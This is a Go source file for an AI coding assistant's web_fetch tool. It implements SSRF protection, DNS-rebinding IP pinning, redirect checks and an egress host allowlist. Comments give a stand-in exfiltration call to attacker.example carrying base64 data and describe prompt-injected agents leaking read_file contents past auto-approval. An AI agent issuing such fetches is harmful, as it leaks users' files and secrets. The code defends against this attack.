package tools

import (
	"context"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/url"
	"strings"
	"time"

	"github.com/dontfuckmycode/dfmc/internal/security"
)

// userAgent identifies DFMC when fetching URLs. Real UA string so servers
// don't rate-limit us as a bot.
const userAgent = "DFMC/1.0 (+https://github.com/dontfuckmycode/dfmc)"

// safeTransport dials with an IP-level SSRF guard. The resolved IP is
// checked at connect time (not before), closing the DNS rebinding window.
// CRIT-003 / VULN-059 fix: after resolving all IPs and checking them, we
// PIN the first validated IP so a malicious DNS server cannot rebind between
// our check and the actual connection. TLS SNI is driven by Request.Host,
// not the dial address, so HTTPS still validates the certificate against
// the original hostname.
var safeTransport = &http.Transport{
	DialContext: func(ctx context.Context, network, addr string) (net.Conn, error) {
		host, port, err := net.SplitHostPort(addr)
		if err != nil {
			return nil, fmt.Errorf("invalid address %q: %w", addr, err)
		}
		if ip := net.ParseIP(host); ip != nil {
			if security.IsBlockedDialTarget(ip) {
				return nil, fmt.Errorf("SSRF guard: refusing dial to blocked IP %q", ip)
			}
			// addr is already an IP — no DNS lookup needed, no rebinding window.
			return net.DialTimeout(network, addr, 10*time.Second)
		}
		resolverHost := normalizeResolverHost(host)
		ips, err := net.DefaultResolver.LookupIPAddr(ctx, resolverHost)
		if err != nil {
			return nil, fmt.Errorf("resolve %q: %w", resolverHost, err)
		}
		for _, ip := range ips {
			if security.IsBlockedDialTarget(ip.IP) {
				return nil, fmt.Errorf("SSRF guard: %q resolves to blocked IP %s", resolverHost, ip.IP)
			}
		}
		// CRIT-003 fix (mirrors safe_http.go): pin the validated first IP so
		// a TTL=0 DNS rebind cannot swap between check and dial. TLS SNI (Server
		// Name Indication) is driven by http.Request.Host → http.Transport sets
		// it from the original URL, NOT from the dial address, so HTTPS still
		// verifies the certificate against the hostname.
		pinnedAddr := net.JoinHostPort(ips[0].IP.String(), port)
		return net.DialTimeout(network, pinnedAddr, 10*time.Second)
	},
}

// httpClient is shared across web tools so connection pooling works.
var httpClient = &http.Client{
	Timeout:   20 * time.Second,
	Transport: safeTransport,
	CheckRedirect: func(req *http.Request, via []*http.Request) error {
		if len(via) >= 5 {
			return fmt.Errorf("stopped after 5 redirects")
		}
		// HIGH-007 fix: validate the redirect destination URL's host before
		// following. Without this, a public result that redirects through a
		// private IP could slip past the transport-level SSRF guard if the
		// redirect URL itself isn't a direct private-IP URL.
		if req.URL != nil && req.URL.Host != "" {
			if isBlockedHost(req.URL.Host) {
				return fmt.Errorf("SSRF guard: redirect target %q resolves to blocked address", req.URL.Host)
			}
		}
		return nil
	},
}

// isBlockedHost is a best-effort resolver used only for filtering search
// results before they are shown to the model. Unlike web_fetch, this is not
// a security boundary by itself — the actual SSRF guard lives in
// safeTransport.DialContext at connect time. Delegates to
// security.IsBlockedDialTarget so the rejection set stays consistent
// with the provider router's dial guard.
func isBlockedHost(host string) bool {
	h := host
	if strings.Contains(h, ":") {
		h, _, _ = net.SplitHostPort(h)
	}
	h = normalizeResolverHost(h)
	ips, err := net.LookupIP(h)
	if err != nil {
		return true
	}
	for _, ip := range ips {
		if security.IsBlockedDialTarget(ip) {
			return true
		}
	}
	return false
}

func normalizeResolverHost(host string) string {
	host = strings.TrimSpace(host)
	if zoneIdx := strings.LastIndex(host, "%"); zoneIdx > 0 {
		base := host[:zoneIdx]
		if ip := net.ParseIP(base); ip != nil {
			return base
		}
	}
	return host
}

// WebFetchTool does an HTTP GET, converts HTML to text, and returns a
// token-budgeted excerpt. Not a full browser — skips JavaScript, follows up
// to 5 redirects.
//
// AllowedHosts (when non-empty) is the egress allowlist: defense-in-
// depth that fires BEFORE the SSRF transport guard so a tainted
// `web_fetch https://attacker.example/?d=<base64>` is refused even
// when `DFMC_APPROVE=yes` would have silently auto-approved it.
// Empty list disables the check (preserves prior behavior).
type WebFetchTool struct {
	AllowedHosts []string
}

func NewWebFetchTool() *WebFetchTool { return &WebFetchTool{} }
func (t *WebFetchTool) Name() string { return "web_fetch" }
func (t *WebFetchTool) Description() string {
	return "Fetch a URL and return its text content (HTML stripped)."
}

// SetAllowedHosts wires the egress allowlist from config. Called by
// the engine constructor (engine_register_defaults.go) so the tool
// instance carries the policy that was loaded at startup.
func (t *WebFetchTool) SetAllowedHosts(hosts []string) {
	t.AllowedHosts = append(t.AllowedHosts[:0], hosts...)
}

// hostAllowed checks `host` against the configured allowlist. Returns
// (true, "") when the allowlist is empty (opt-in: no policy → allow).
// Otherwise returns (true, "") when host matches an exact entry or
// a "*.suffix" wildcard, and (false, reason) otherwise. Matching is
// case-insensitive on host; entries may include ports (rarely needed)
// but normal usage passes hostnames only.
func hostAllowed(host string, allow []string) (bool, string) {
	if len(allow) == 0 {
		return true, ""
	}
	h := strings.ToLower(strings.TrimSpace(host))
	if h == "" {
		return false, "host is empty"
	}
	for _, raw := range allow {
		entry := strings.ToLower(strings.TrimSpace(raw))
		if entry == "" {
			continue
		}
		if strings.HasPrefix(entry, "*.") {
			suffix := entry[1:] // includes the leading dot, e.g. ".github.com"
			if strings.HasSuffix(h, suffix) {
				return true, ""
			}
			continue
		}
		if h == entry {
			return true, ""
		}
	}
	return false, fmt.Sprintf("host %q is not on the web_fetch allowlist (%d entries configured). Add it to cfg.WebFetch.AllowedHosts or use a more specific tool", host, len(allow))
}

func (t *WebFetchTool) Execute(ctx context.Context, req Request) (Result, error) {
	raw := strings.TrimSpace(asString(req.Params, "url", ""))
	if raw == "" {
		return Result{}, missingParamError("web_fetch", "url", req.Params,
			`{"url":"https://example.com/docs/api"} or {"url":"https://...","max_bytes":524288}`,
			`url must be a full http(s) URL. Returns text content with HTML stripped. Loopback / private / link-local addresses are blocked (SSRF guard). Cap raw bytes with max_bytes (128KB-1MB).`)
	}
	u, err := url.Parse(raw)
	if err != nil || !(u.Scheme == "http" || u.Scheme == "https") {
		scheme := ""
		if u != nil {
			scheme = u.Scheme
		}
		return Result{}, fmt.Errorf(
			"web_fetch: url must be a full http(s) URL, got %q (scheme=%q). "+
				"Use the absolute form: %s. "+
				"file://, ftp://, data:, javascript:, and bare hostnames without a scheme are rejected",
			raw, scheme,
			`{"name":"web_fetch","args":{"url":"https://example.com/path"}}`)
	}
	// Egress allowlist check happens BEFORE the dial so a tainted URL
	// (data exfiltration from a recent read_file via the LLM-prompt-
	// injection path) is refused at the tool boundary, not at the
	// transport — and the refusal happens regardless of any
	// DFMC_APPROVE auto-yes flow that bypassed the per-tool approval.
	hostForCheck := u.Hostname()
	if ok, reason := hostAllowed(hostForCheck, t.AllowedHosts); !ok {
		return Result{}, fmt.Errorf("web_fetch refused: %s", reason)
	}
	maxBytes := asInt(req.Params, "max_bytes", 128*1024)
	if maxBytes <= 0 {
		maxBytes = 128 * 1024
	}
	if maxBytes > 1024*1024 {
		maxBytes = 1024 * 1024
	}
	rawOut := asBool(req.Params, "raw", false)

	httpReq, err := http.NewRequestWithContext(ctx, http.MethodGet, u.String(), nil)
	if err != nil {
		return Result{}, err
	}
	httpReq.Header.Set("User-Agent", userAgent)
	httpReq.Header.Set("Accept", "text/html,application/xhtml+xml,text/plain,*/*;q=0.5")
	httpReq.Header.Set("Accept-Language", "en-US,en;q=0.8")

	resp, err := httpClient.Do(httpReq)
	if err != nil {
		if isSSRFFetchError(err) {
			return Result{}, fmt.Errorf("url resolves to a blocked (private/loopback/link-local) address — SSRF protection")
		}
		return Result{}, fmt.Errorf("fetch failed: %w", err)
	}
	defer func() { _ = resp.Body.Close() }()

	limited := io.LimitReader(resp.Body, int64(maxBytes)+1)
	data, err := io.ReadAll(limited)
	if err != nil {
		return Result{}, fmt.Errorf("read body: %w", err)
	}
	truncated := len(data) > maxBytes
	if truncated {
		data = data[:maxBytes]
	}
	body := string(data)
	contentType := resp.Header.Get("Content-Type")

	output := body
	if !rawOut && strings.Contains(strings.ToLower(contentType), "html") {
		output = htmlToText(body)
	}

	return Result{
		Output: output,
		Data: map[string]any{
			"url":          u.String(),
			"status":       resp.StatusCode,
			"content_type": contentType,
			"bytes":        len(data),
			"truncated":    truncated,
		},
		Truncated: truncated,
	}, nil
}

// HTML-to-text stripping (htmlToText, dropTags, blockTags,
// finalizeStrippedText, isSSRFFetchError) lives in web_html.go.
